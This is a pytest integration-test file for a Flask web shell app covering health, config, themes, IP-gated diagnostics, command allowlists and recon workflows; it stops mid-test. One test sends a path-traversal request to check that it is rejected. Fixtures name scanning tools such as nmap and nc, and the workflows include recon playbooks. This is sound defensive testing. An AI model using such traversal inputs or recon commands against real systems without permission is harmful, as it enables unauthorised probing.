"""
Integration tests for Flask routes using the test client.
These tests exercise HTTP-level behaviour without starting a real server.
Run with: pytest tests/ (from the repo root)
"""

import json
import logging
import os
import re
import sqlite3
import tempfile
import uuid
from datetime import datetime, timedelta, timezone
from pathlib import Path
from urllib.parse import quote
import unittest.mock as mock

import app as shell_app
import blueprints.assets as shell_assets
import config
from database import DB_PATH
from workspace import resolve_workspace_path


# ── Fixtures ──────────────────────────────────────────────────────────────────
# Route tests intentionally disable rate limiting so individual cases can focus
# on route behavior rather than shared per-IP quota state.

def get_client(*, use_forwarded_for=True):
    shell_app.app.config["TESTING"] = True
    shell_app.app.config["RATELIMIT_ENABLED"] = False
    client = shell_app.app.test_client()
    if use_forwarded_for:
        client.environ_base["HTTP_X_FORWARDED_FOR"] = f"203.0.113.{uuid.uuid4().int % 250 + 1}"
    return client


class _RouteFakeProc:
    def __init__(self, pid=4321):
        self.pid = pid
        self.stdout = mock.Mock()


class _CapturedThread:
    instances = []

    def __init__(self, *, target=None, kwargs=None, name="", daemon=None):
        self.target = target
        self.kwargs = kwargs or {}
        self.name = name
        self.daemon = daemon
        self.started = False
        self.__class__.instances.append(self)

    def start(self):
        self.started = True


# ── / ─────────────────────────────────────────────────────────────────────────

class TestIndexRoute:
    def test_returns_200(self):
        client = get_client()
        resp = client.get("/")
        assert resp.status_code == 200

    def test_returns_html(self):
        client = get_client()
        resp = client.get("/")
        assert b"<!DOCTYPE html>" in resp.data or b"<html" in resp.data.lower()

    def test_desktop_diag_link_opens_in_new_tab_while_mobile_action_stays_button(self):
        client = get_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            body = client.get("/").get_data(as_text=True)
        assert 'id="rail-diag-btn"' in body
        assert 'href="/diag"' in body
        assert 'target="_blank"' in body
        assert 'rel="noopener noreferrer"' in body
        assert 'data-menu-action="diag"' in body

    def test_bootstrapped_app_config_matches_config_route(self):
        client = get_client(use_forwarded_for=False)
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            body = client.get("/").get_data(as_text=True)
            config_payload = json.loads(client.get("/config").data)
        match = re.search(
            r'<script id="app-config-json" type="application/json">(.*?)</script>',
            body,
            re.S,
        )
        assert match
        boot_payload = json.loads(match.group(1))
        assert boot_payload == config_payload

# ── /health ───────────────────────────────────────────────────────────────────

class TestHealthRoute:
    def test_returns_200_when_db_ok(self):
        client = get_client()
        resp = client.get("/health")
        assert resp.status_code == 200

    def test_response_is_json(self):
        client = get_client()
        resp = client.get("/health")
        data = json.loads(resp.data)
        assert "status" in data
        assert "db" in data
        assert "redis" in data

    def test_db_true_when_sqlite_available(self):
        client = get_client()
        resp = client.get("/health")
        data = json.loads(resp.data)
        assert data["db"] is True

    def test_redis_null_when_no_redis(self):
        # In the test environment there is no Redis configured
        client = get_client()
        resp = client.get("/health")
        data = json.loads(resp.data)
        assert data["redis"] is None

    def test_status_degraded_when_db_fails(self):
        client = get_client()
        with mock.patch("blueprints.assets.db_connect", side_effect=Exception("db error")):
            resp = client.get("/health")
        assert resp.status_code == 503
        data = json.loads(resp.data)
        assert data["status"] == "degraded"
        assert data["db"] is False

    def test_status_ok_when_redis_pings_successfully(self):
        client = get_client()
        fake_redis = mock.MagicMock()
        fake_redis.ping.return_value = True
        with mock.patch("blueprints.assets.redis_client", fake_redis):
            resp = client.get("/health")
        assert resp.status_code == 200
        data = json.loads(resp.data)
        assert data["status"] == "ok"
        assert data["redis"] is True

    def test_status_degraded_when_redis_ping_fails(self):
        client = get_client()
        fake_redis = mock.MagicMock()
        fake_redis.ping.side_effect = Exception("redis down")
        with mock.patch("blueprints.assets.redis_client", fake_redis):
            resp = client.get("/health")
        assert resp.status_code == 503
        data = json.loads(resp.data)
        assert data["status"] == "degraded"
        assert data["redis"] is False


# ── /log ──────────────────────────────────────────────────────────────────────

class TestClientLogRoute:
    def test_accepts_client_error_payload(self):
        client = get_client()
        with mock.patch.object(shell_assets.log, "warning") as mock_warning:
            resp = client.post("/log", json={
                "context": "session-token set",
                "message": "ReferenceError: global is not defined",
            })
        assert resp.status_code == 200
        assert resp.get_json() == {"ok": True}
        mock_warning.assert_called_once()
        assert mock_warning.call_args[0][0] == "CLIENT_ERROR"
        extra = mock_warning.call_args.kwargs["extra"]
        assert extra["context"] == "session-token set"
        assert extra["client_message"] == "ReferenceError: global is not defined"


# ── /status ───────────────────────────────────────────────────────────────────

class TestStatusRoute:
    def test_returns_200_even_when_db_fails(self):
        # /status is for live HUD polling; it must never return 503 so a
        # blip doesn't tear down the UI. Fields report state instead.
        client = get_client()
        with mock.patch("blueprints.assets.db_connect", side_effect=Exception("db error")):
            resp = client.get("/status")
        assert resp.status_code == 200

    def test_response_contains_expected_keys(self):
        client = get_client()
        data = json.loads(client.get("/status").data)
        for key in ("uptime", "db", "redis", "server_time"):
            assert key in data

    def test_uptime_is_non_negative_integer(self):
        client = get_client()
        data = json.loads(client.get("/status").data)
        assert isinstance(data["uptime"], int)
        assert data["uptime"] >= 0

    def test_db_ok_when_sqlite_available(self):
        client = get_client()
        data = json.loads(client.get("/status").data)
        assert data["db"] == "ok"

    def test_db_down_when_sqlite_fails(self):
        client = get_client()
        with mock.patch("blueprints.assets.db_connect", side_effect=Exception("db error")):
            data = json.loads(client.get("/status").data)
        assert data["db"] == "down"

    def test_redis_none_when_not_configured(self):
        # In the test environment there is no Redis configured.
        client = get_client()
        data = json.loads(client.get("/status").data)
        assert data["redis"] == "none"

    def test_redis_ok_when_ping_succeeds(self):
        client = get_client()
        fake_redis = mock.MagicMock()
        fake_redis.ping.return_value = True
        with mock.patch("blueprints.assets.redis_client", fake_redis):
            data = json.loads(client.get("/status").data)
        assert data["redis"] == "ok"

    def test_redis_down_when_ping_fails(self):
        client = get_client()
        fake_redis = mock.MagicMock()
        fake_redis.ping.side_effect = Exception("redis down")
        with mock.patch("blueprints.assets.redis_client", fake_redis):
            data = json.loads(client.get("/status").data)
        assert data["redis"] == "down"

    def test_server_time_is_ms_epoch(self):
        client = get_client()
        data = json.loads(client.get("/status").data)
        assert isinstance(data["server_time"], int)
        # Any plausible ms-epoch timestamp in 2026 fits in 13 digits.
        assert 1e12 < data["server_time"] < 1e13


# ── /config ───────────────────────────────────────────────────────────────────

class TestConfigRoute:
    def test_returns_200(self):
        client = get_client()
        resp = client.get("/config")
        assert resp.status_code == 200

    def test_contains_expected_keys(self):
        client = get_client()
        data = json.loads(client.get("/config").data)
        for key in (
            "app_name", "project_readme", "prompt_prefix", "default_theme",
            "max_tabs", "max_output_lines", "workspace_enabled",
        ):
            assert key in data
        assert "share_redaction_enabled" in data
        assert "share_redaction_rules" in data

    def test_workspace_menu_affordances_follow_config(self):
        client = get_client()
        with mock.patch.dict("config.CFG", {"workspace_enabled": False}):
            disabled_body = client.get("/").get_data(as_text=True)
        with mock.patch.dict("config.CFG", {"workspace_enabled": True}):
            enabled_body = client.get("/").get_data(as_text=True)

        assert 'data-action="workspace"' not in disabled_body
        assert 'data-menu-action="workspace"' not in disabled_body
        assert 'data-action="workspace"' in enabled_body
        assert 'data-menu-action="workspace"' in enabled_body

    def test_max_tabs_is_int(self):
        client = get_client()
        data = json.loads(client.get("/config").data)
        assert isinstance(data["max_tabs"], int)

    def test_contains_timeout_and_welcome_keys(self):
        client = get_client()
        data = json.loads(client.get("/config").data)
        for key in ("command_timeout_seconds",
                    "welcome_char_ms", "welcome_jitter_ms",
                    "welcome_post_cmd_ms", "welcome_inter_block_ms",
                    "welcome_first_prompt_idle_ms", "welcome_post_status_pause_ms",
                    "welcome_sample_count", "welcome_status_labels",
                    "welcome_hint_interval_ms", "welcome_hint_rotations"):
            assert key in data, f"missing key: {key}"

    def test_all_new_keys_are_ints(self):
        client = get_client()
        data = json.loads(client.get("/config").data)
        for key in ("command_timeout_seconds",
                    "welcome_char_ms", "welcome_jitter_ms",
                    "welcome_post_cmd_ms", "welcome_inter_block_ms",
                    "welcome_first_prompt_idle_ms", "welcome_post_status_pause_ms",
                    "welcome_sample_count", "welcome_hint_interval_ms",
                    "welcome_hint_rotations"):
            assert isinstance(data[key], int), f"{key} should be int, got {type(data[key])}"
        assert isinstance(data["welcome_status_labels"], list)
        assert all(isinstance(item, str) for item in data["welcome_status_labels"])

    def test_command_timeout_reflects_cfg(self):
        client = get_client()
        with mock.patch.dict("config.CFG", {"command_timeout_seconds": 300}):
            data = json.loads(client.get("/config").data)
        assert data["command_timeout_seconds"] == 300

    def test_prompt_prefix_reflects_cfg(self):
        client = get_client()
        with mock.patch.dict("config.CFG", {"prompt_prefix": "ops@darklab:~$"}):
            data = json.loads(client.get("/config").data)
        assert data["prompt_prefix"] == "ops@darklab:~$"

    def test_project_readme_is_constant(self):
        client = get_client()
        with mock.patch("config.PROJECT_README", "https://example.invalid/README.md"):
            data = json.loads(client.get("/config").data)
        assert data["project_readme"] == "https://example.invalid/README.md"

    def test_welcome_timing_reflects_cfg(self):
        client = get_client()
        overrides = {
            "welcome_char_ms": 25,
            "welcome_jitter_ms": 5,
            "welcome_post_cmd_ms": 400,
            "welcome_inter_block_ms": 1000,
            "welcome_first_prompt_idle_ms": 1800,
            "welcome_post_status_pause_ms": 300,
            "welcome_sample_count": 4,
            "welcome_status_labels": ["CONFIG", "CACHE", "READY"],
            "welcome_hint_interval_ms": 3000,
            "welcome_hint_rotations": 1,
        }
        with mock.patch.dict("config.CFG", overrides):
            data = json.loads(client.get("/config").data)
        for key, val in overrides.items():
            assert data[key] == val, f"{key}: expected {val}, got {data[key]}"

    def test_command_timeout_defaults_to_one_hour(self):
        # Default config keeps long-running commands bounded to an hour
        client = get_client()
        with mock.patch.dict("config.CFG", {"command_timeout_seconds": 3600}):
            data = json.loads(client.get("/config").data)
        assert data["command_timeout_seconds"] == 3600

    def test_diag_enabled_false_when_cidrs_empty(self):
        client = get_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": []}):
            data = json.loads(client.get("/config").data)
        assert data["diag_enabled"] is False

    def test_diag_enabled_false_when_client_ip_not_in_cidrs(self):
        client = get_client(use_forwarded_for=False)
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["10.0.0.0/8"]}):
            data = json.loads(client.get("/config").data)
        assert data["diag_enabled"] is False

    def test_diag_enabled_true_when_client_ip_in_cidrs(self):
        client = get_client(use_forwarded_for=False)
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            data = json.loads(client.get("/config").data)
        assert data["diag_enabled"] is True

    def test_diag_enabled_uses_trusted_forwarded_for_when_present(self):
        client = get_client(use_forwarded_for=True)
        with mock.patch.dict("config.CFG", {
            "diagnostics_allowed_cidrs": ["203.0.113.0/24"],
            "trusted_proxy_cidrs": ["127.0.0.1/32"],
        }):
            data = json.loads(client.get("/config").data)
        assert data["diag_enabled"] is True

    def test_diag_enabled_ignores_forwarded_for_from_untrusted_peer(self):
        client = get_client(use_forwarded_for=True)
        with mock.patch.dict("config.CFG", {
            "diagnostics_allowed_cidrs": ["203.0.113.0/24"],
            "trusted_proxy_cidrs": ["10.0.0.0/8"],
        }):
            data = json.loads(client.get("/config").data)
        assert data["diag_enabled"] is False

    def test_share_redaction_rules_reflect_cfg(self):
        client = get_client()
        rules = [
            {"label": "bearer", "pattern": "Bearer\\s+\\S+", "replacement": "Bearer [redacted]", "flags": "i"},
        ]
        with mock.patch.dict("config.CFG", {
            "share_redaction_enabled": True,
            "share_redaction_rules": rules,
        }):
            data = json.loads(client.get("/config").data)
        assert data["share_redaction_enabled"] is True
        assert any(rule["label"] == "bearer token" for rule in data["share_redaction_rules"])
        assert data["share_redaction_rules"][-1] == rules[0]

    def test_share_redaction_rules_empty_when_disabled(self):
        client = get_client()
        with mock.patch.dict("config.CFG", {
            "share_redaction_enabled": False,
            "share_redaction_rules": [
                {"label": "custom", "pattern": "internal", "replacement": "[custom]"},
            ],
        }):
            data = json.loads(client.get("/config").data)
        assert data["share_redaction_enabled"] is False
        assert data["share_redaction_rules"] == []


# ── /themes ──────────────────────────────────────────────────────────────────

class TestThemesRoute:
    def test_returns_200(self):
        client = get_client()
        resp = client.get("/themes")
        assert resp.status_code == 200

    def test_response_has_current_and_themes(self):
        client = get_client()
        data = json.loads(client.get("/themes").data)
        assert "current" in data
        assert "themes" in data
        assert isinstance(data["themes"], list)

    def test_includes_named_theme_variants(self):
        client = get_client()
        data = json.loads(client.get("/themes").data)
        themes = {theme["name"]: theme for theme in data["themes"]}
        assert "apricot_sand" in themes
        assert "olive_grove" in themes
        assert "darklab_obsidian" in themes
        assert "emerald_obsidian" in themes
        assert "charcoal_steel" in themes
        assert "dark" not in themes
        assert "light" not in themes
        assert themes["apricot_sand"]["label"] == "Apricot Sand"
        assert themes["olive_grove"]["label"] == "Olive Grove"
        assert themes["darklab_obsidian"]["label"] == "Darklab Obsidian"
        assert themes["emerald_obsidian"]["label"] == "Emerald Obsidian"
        assert themes["charcoal_steel"]["label"] == "Charcoal Steel"
        assert themes["apricot_sand"]["group"] == "Warm Light"
        assert themes["olive_grove"]["group"] == "Warm Light"
        assert themes["darklab_obsidian"]["group"] == "Dark Neon"
        assert themes["emerald_obsidian"]["group"] == "Dark Neon"
        assert themes["apricot_sand"]["filename"] == "apricot_sand.yaml"
        assert themes["olive_grove"]["filename"] == "olive_grove.yaml"
        assert themes["darklab_obsidian"]["filename"] == "darklab_obsidian.yaml"
        assert themes["emerald_obsidian"]["filename"] == "emerald_obsidian.yaml"

    def test_default_theme_is_exposed_as_filename(self):
        client = get_client()
        with mock.patch.dict("config.CFG", {"default_theme": "darklab_obsidian.yaml"}):
            data = json.loads(client.get("/config").data)
        assert data["default_theme"] == "darklab_obsidian.yaml"

    def test_default_theme_filename_selects_variant(self):
        client = get_client(use_forwarded_for=False)
        data = json.loads(client.get("/themes").data)
        assert data["current"]["name"] == "darklab_obsidian"
        assert data["current"]["filename"] == "darklab_obsidian.yaml"
        assert data["current"]["label"] == "Darklab Obsidian"
        assert data["current"]["group"] == "Dark Neon"
        assert data["current"]["sort"] == 0

    def test_pref_theme_name_cookie_selects_variant(self):
        client = get_client(use_forwarded_for=False)
        client.set_cookie("pref_theme_name", "apricot_sand")
        data = json.loads(client.get("/themes").data)
        assert data["current"]["name"] == "apricot_sand"
        assert data["current"]["label"] == "Apricot Sand"
        assert data["current"]["group"] == "Warm Light"

    def test_empty_registry_falls_back_to_built_in_dark_theme(self, monkeypatch):
        client = get_client(use_forwarded_for=False)
        monkeypatch.setitem(config.CFG, "default_theme", "theme_missing.yaml")
        monkeypatch.setitem(shell_app.get_theme_entry.__globals__, "THEME_REGISTRY_MAP", {})
        monkeypatch.setitem(shell_app.get_theme_entry.__globals__, "THEME_REGISTRY", [])

        data = json.loads(client.get("/themes").data)
        assert data["current"]["name"] == "dark"
        assert data["current"]["source"] == "built-in"
        assert data["current"]["group"] == "Other"
        assert data["current"]["sort"] == 0
        assert data["themes"] == []


# ── /vendor assets ───────────────────────────────────────────────────────────

class TestVendorAssets:
    def test_ansi_up_js_is_served(self):
        client = get_client()
        resp = client.get("/vendor/ansi_up.js")
        assert resp.status_code == 200
        assert "javascript" in resp.content_type

    def test_jspdf_js_is_served(self):
        client = get_client()
        resp = client.get("/vendor/jspdf.umd.min.js")
        assert resp.status_code == 200
        assert "javascript" in resp.content_type

    def test_font_route_serves_committed_file(self, tmp_path, monkeypatch):
        client = get_client()
        font_dir = tmp_path / "fonts"
        font_dir.mkdir()
        (font_dir / "JetBrainsMono-400.ttf").write_bytes(b"font bytes")
        monkeypatch.setattr(shell_assets, "_FONT_DIR", font_dir)

        resp = client.get("/vendor/fonts/JetBrainsMono-400.ttf")
        assert resp.status_code == 200
        assert resp.data == b"font bytes"

    def test_font_route_rejects_unknown_or_traversal_paths(self):
        client = get_client()

        resp = client.get("/vendor/fonts/UnknownFont.ttf")
        assert resp.status_code == 404

        resp = client.get("/vendor/fonts/../../app.py")
        assert resp.status_code == 404


# ── /diag ─────────────────────────────────────────────────────────────────────

class TestDiagRoute:
    """Operator diagnostics endpoint — IP-gated, returns 404 when unconfigured."""

    def _allowed_client(self):
        """Test client whose remote_addr (127.0.0.1) matches the allowed CIDR."""
        shell_app.app.config["TESTING"] = True
        shell_app.app.config["RATELIMIT_ENABLED"] = False
        # No X-Forwarded-For — we want remote_addr to be 127.0.0.1 (Werkzeug default)
        return shell_app.app.test_client()

    def test_returns_404_when_cidrs_empty(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": []}):
            with mock.patch.object(logging.getLogger("shell"), "warning") as mock_warn:
                resp = client.get("/diag")
        assert resp.status_code == 404
        mock_warn.assert_called_once()
        event = mock_warn.call_args[0][0]
        assert event == "DIAG_DENIED"
        assert mock_warn.call_args[1]["extra"]["ip"] == "127.0.0.1"
        assert mock_warn.call_args[1]["extra"]["allowed_cidrs"] == []

    def test_returns_404_when_cidrs_not_set(self):
        client = self._allowed_client()
        cfg_without_key = {k: v for k, v in config.CFG.items() if k != "diagnostics_allowed_cidrs"}
        with mock.patch.dict("config.CFG", cfg_without_key, clear=True):
            resp = client.get("/diag")
        assert resp.status_code == 404

    def test_returns_404_when_client_ip_not_in_cidrs(self):
        client = get_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["10.0.0.0/8"]}):
            resp = client.get("/diag")
        assert resp.status_code == 404

    def test_returns_200_when_client_ip_in_cidrs(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            resp = client.get("/diag")
        assert resp.status_code == 200

    def test_response_has_expected_top_level_keys(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            data = json.loads(client.get("/diag?format=json").data)
        assert set(data.keys()) >= {"app", "config", "db", "redis", "assets", "tools"}

    def test_app_section_has_version_and_name(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {
            "diagnostics_allowed_cidrs": ["127.0.0.1/32"],
            "app_name": "test shell",
        }):
            data = json.loads(client.get("/diag?format=json").data)
        assert data["app"]["name"] == "test shell"
        assert isinstance(data["app"]["version"], str)

    def test_config_section_contains_operational_keys(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            data = json.loads(client.get("/diag?format=json").data)
        cfg = data["config"]
        for key in ("rate_limit_enabled", "command_timeout_seconds", "max_output_lines",
                    "persist_full_run_output", "permalink_retention_days",
                    "share_redaction_enabled", "custom_redaction_rule_count"):
            assert key in cfg, f"missing config key: {key}"

    def test_db_section_ok_and_has_counts(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            data = json.loads(client.get("/diag?format=json").data)
        assert data["db"]["ok"] is True
        assert isinstance(data["db"]["runs"], int)
        assert isinstance(data["db"]["snapshots"], int)

    def test_db_section_error_on_db_failure(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            with mock.patch("blueprints.assets.db_connect", side_effect=Exception("db down")):
                data = json.loads(client.get("/diag?format=json").data)
        assert data["db"]["ok"] is False
        assert "error" in data["db"]

    def test_redis_section_reflects_client_presence(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            data = json.loads(client.get("/diag?format=json").data)
        assert "configured" in data["redis"]

    def test_assets_section_reports_loaded_when_files_present(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            data = json.loads(client.get("/diag?format=json").data)
        assert data["assets"]["ansi_up"] == "loaded"
        assert data["assets"]["jspdf"] == "loaded"
        assert data["assets"]["fonts"] == "loaded"

    def test_assets_section_reports_missing_when_files_absent(self, tmp_path, monkeypatch):
        client = self._allowed_client()
        monkeypatch.setattr(shell_assets, "_ANSI_UP_JS", tmp_path / "missing_ansi_up.js")
        monkeypatch.setattr(shell_assets, "_JSPDF_JS", tmp_path / "missing_jspdf.js")
        monkeypatch.setattr(shell_assets, "_FONT_DIR", tmp_path / "missing_fonts")
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            data = json.loads(client.get("/diag?format=json").data)
        assert data["assets"]["ansi_up"] == "missing"
        assert data["assets"]["jspdf"] == "missing"
        assert data["assets"]["fonts"] == "missing"

    def test_tools_section_has_present_and_missing_lists(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            data = json.loads(client.get("/diag?format=json").data)
        assert isinstance(data["tools"]["present"], list)
        assert isinstance(data["tools"]["missing"], list)

    def test_tools_present_contains_known_binary(self):
        """curl is allowed and installed in the dev environment."""
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            data = json.loads(client.get("/diag?format=json").data)
        # At minimum, basic tools available in dev should appear in present
        present = data["tools"]["present"]
        assert isinstance(present, list)
        # Every entry in present must actually resolve via which()
        import shutil as _shutil
        for tool in present:
            assert _shutil.which(tool) is not None, f"{tool} in present but not found by which()"

    def test_honors_forwarded_for_header_from_trusted_proxy(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {
            "diagnostics_allowed_cidrs": ["10.0.0.0/8"],
            "trusted_proxy_cidrs": ["127.0.0.1/32"],
        }):
            resp = client.get("/diag", headers={"X-Forwarded-For": "10.0.0.1"})
        assert resp.status_code == 200

    def test_ignores_forwarded_for_header_from_untrusted_proxy(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {
            "diagnostics_allowed_cidrs": ["10.0.0.0/8"],
            "trusted_proxy_cidrs": ["192.0.2.0/24"],
        }):
            resp = client.get("/diag", headers={"X-Forwarded-For": "10.0.0.1"})
        assert resp.status_code == 404

    def test_diag_viewed_logged_on_success(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            with mock.patch.object(logging.getLogger("shell"), "info") as mock_info:
                resp = client.get("/diag")
        assert resp.status_code == 200
        events = [call[0][0] for call in mock_info.call_args_list]
        assert "DIAG_VIEWED" in events
        viewed_call = next(c for c in mock_info.call_args_list if c[0][0] == "DIAG_VIEWED")
        assert viewed_call[1]["extra"]["ip"] == "127.0.0.1"

    def test_html_response_contains_expected_content(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {
            "diagnostics_allowed_cidrs": ["127.0.0.1/32"],
            "app_name": "diag test shell",
        }):
            resp = client.get("/diag")
        body = resp.get_data(as_text=True)
        assert "diag test shell" in body
        assert "operator diagnostics" in body
        assert 'class="btn btn-secondary btn-compact diag-back-btn"' in body
        assert 'href="/"' in body
        assert "back to shell" in body
        assert "<!DOCTYPE html>" in body or "<html" in body.lower()

    def test_html_response_renders_zero_custom_redaction_rule_count_as_numeric_zero(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {
            "diagnostics_allowed_cidrs": ["127.0.0.1/32"],
            "share_redaction_enabled": True,
            "share_redaction_rules": [],
        }):
            body = client.get("/diag").get_data(as_text=True)
        assert "custom_redaction_rule_count" in body
        assert ">0<" in body

    def test_json_format_param_returns_json(self):
        client = self._allowed_client()
        with mock.patch.dict("config.CFG", {"diagnostics_allowed_cidrs": ["127.0.0.1/32"]}):
            resp = client.get("/diag?format=json")
        assert "application/json" in resp.content_type
        data = json.loads(resp.data)
        assert "app" in data


# ── /allowed-commands ─────────────────────────────────────────────────────────

class TestAllowedCommandsRoute:
    def test_returns_200(self):
        client = get_client()
        resp = client.get("/allowed-commands")
        assert resp.status_code == 200

    def test_response_has_restricted_key(self):
        client = get_client()
        data = json.loads(client.get("/allowed-commands").data)
        assert "restricted" in data

    def test_unrestricted_when_no_file(self):
        client = get_client()
        with mock.patch("blueprints.content.load_commands_registry", return_value={"commands": [], "pipe_helpers": []}):
            data = json.loads(client.get("/allowed-commands").data)
        assert data["restricted"] is False

    def test_restricted_when_file_present(self):
        client = get_client()
        with mock.patch("blueprints.content.load_commands_registry", return_value={
            "commands": [
                {"root": "ping", "category": "Networking", "policy": {"allow": ["ping"], "deny": []}},
                {"root": "nmap", "category": "Scanning", "policy": {"allow": ["nmap"], "deny": []}},
            ],
            "pipe_helpers": [],
        }):
            data = json.loads(client.get("/allowed-commands").data)
        assert data["restricted"] is True
        assert "ping" in data["commands"]

    def test_returns_grouped_commands_when_restricted(self):
        client = get_client()
        groups = [{"name": "Networking", "commands": ["ping", "traceroute"]}]
        with mock.patch("blueprints.content.load_commands_registry", return_value={
            "commands": [
                {"root": "ping", "category": "Networking", "policy": {"allow": ["ping"], "deny": []}},
                {
                    "root": "traceroute",
                    "category": "Networking",
                    "policy": {"allow": ["traceroute"], "deny": []},
                },
            ],
            "pipe_helpers": [],
        }):
            data = json.loads(client.get("/allowed-commands").data)
        assert data["restricted"] is True
        assert data["groups"] == groups

    def test_returns_root_commands_for_prefixed_policy_entries(self):
        client = get_client()
        with mock.patch("blueprints.content.load_commands_registry", return_value={
            "commands": [
                {"root": "nc", "category": "Networking", "policy": {"allow": ["nc -z"], "deny": []}},
                {
                    "root": "openssl",
                    "category": "TLS",
                    "policy": {"allow": ["openssl s_client", "openssl ciphers"], "deny": []},
                },
            ],
            "pipe_helpers": [],
        }):
            data = json.loads(client.get("/allowed-commands").data)

        assert data["commands"] == ["nc", "openssl"]
        assert data["groups"] == [
            {"name": "Networking", "commands": ["nc"]},
            {"name": "TLS", "commands": ["openssl"]},
        ]


class TestAutocompleteWorkspaceRoute:
    def test_workspace_roots_follow_workspace_config(self):
        client = get_client()
        with mock.patch.dict("config.CFG", {"workspace_enabled": False}):
            disabled = json.loads(client.get("/autocomplete").data)
        with mock.patch.dict("config.CFG", {"workspace_enabled": True}):
            enabled = json.loads(client.get("/autocomplete").data)

        disabled_roots = set(disabled["builtin_command_roots"])
        enabled_roots = set(enabled["builtin_command_roots"])
        assert {"file", "cat", "ls", "rm"}.isdisjoint(disabled_roots)
        assert {"file", "cat", "ls", "rm"}.issubset(enabled_roots)

    def test_workspace_autocomplete_examples_follow_workspace_config(self):
        client = get_client()
        with mock.patch.dict("config.CFG", {"workspace_enabled": False}):
            disabled = json.loads(client.get("/autocomplete").data)
        with mock.patch.dict("config.CFG", {"workspace_enabled": True}):
            enabled = json.loads(client.get("/autocomplete").data)

        disabled_nmap = disabled["context"]["nmap"]
        enabled_nmap = enabled["context"]["nmap"]
        assert "nmap -sT -iL targets.txt -p 80,443 --open -oN nmap-web.txt" not in {
            item["value"] for item in disabled_nmap["examples"]
        }
        assert "-iL" not in {item["value"] for item in disabled_nmap["flags"]}
        assert "nmap -sT -iL targets.txt -p 80,443 --open -oN nmap-web.txt" in {
            item["value"] for item in enabled_nmap["examples"]
        }
        assert "-iL" in {item["value"] for item in enabled_nmap["flags"]}


# ── /faq ──────────────────────────────────────────────────────────────────────

class TestFaqRoute:
    def test_returns_200(self):
        client = get_client()
        resp = client.get("/faq")
        assert resp.status_code == 200

    def test_items_key_present(self):
        client = get_client()
        data = json.loads(client.get("/faq").data)
        assert "items" in data
        assert isinstance(data["items"], list)

    def test_includes_builtin_faq_entries(self):
        client = get_client()
        data = json.loads(client.get("/faq").data)
        questions = [item.get("question") for item in data["items"]]
        assert "What is this?" in questions
        assert "What commands are allowed?" in questions


# ── /workflows ────────────────────────────────────────────────────────────────

class TestWorkflowsRoute:
    def test_returns_200(self):
        client = get_client()
        resp = client.get("/workflows")
        assert resp.status_code == 200

    def test_includes_v15_recon_playbooks(self):
        client = get_client()
        data = json.loads(client.get("/workflows").data)
        titles = {item.get("title") for item in data["items"]}
        expected = {
            "Domain OSINT / Passive Recon",
            "Subdomain Enumeration & Validation",
            "Web Directory Discovery",
            "SSL / TLS Deep Dive",
            "CDN / Edge Behavior Check",
            "API Recon",
            "Network Path Analysis",
            "Fast Port Discovery to Service Fingerprint",
        }
        assert expected.issubset(titles)

    def test_payload_steps_are_prompt_fillable(self):
        client = get_client()
        data = json.loads(client.get("/workflows").data)
        assert data["items"], "workflow payload should not be empty"
        for item in data["items"]:
            assert isinstance(item.get("title"), str) and item["title"]
            assert isinstance(item.get("description"), str)
            assert isinstance(item.get("inputs"), list)
            assert isinstance(item.get("steps"), list) and item["steps"]
            for workflow_input in item["inputs"]:
                assert isinstance(workflow_input.get("id"), str) and workflow_input["id"].strip()
                assert isinstance(workflow_input.get("label"), str) and workflow_input["label"].strip()
                assert workflow_input.get("type") in {"domain", "host", "url", "port", "path"}
                assert isinstance(workflow_input.get("required"), bool)
                assert isinstance(workflow_input.get("placeholder"), str)
                assert isinstance(workflow_input.get("default"), str)
                assert isinstance(workflow_input.get("help"), str)
            for step in item["steps"]:
                assert isinstance(step.get("cmd"), str) and step["cmd"].strip()
                assert isinstance(step.get("note"), str)

    def test_payload_includes_input_driven_workflows(self):
        client = get_client()
        data = json.loads(client.get("/workflows").data)
        by_title = {item["title"]: item for item in data["items"]}
        dns = by_title["DNS Troubleshooting"]
        assert dns["inputs"] == [
            {
                "id": "domain",
                "label": "Domain",
                "type": "domain",
                "required": True,
                "placeholder": "example.com",
                "default": "darklab.sh",
                "help": "",
            }
        ]
        assert dns["steps"][0]["cmd"] == "dig {{domain}} A"

    def test_workspace_required_workflows_follow_files_feature_flag(self):
        client = get_client()
        with mock.patch.dict(shell_app.CFG, {"workspace_enabled": False}):
            disabled = json.loads(client.get("/workflows").data)
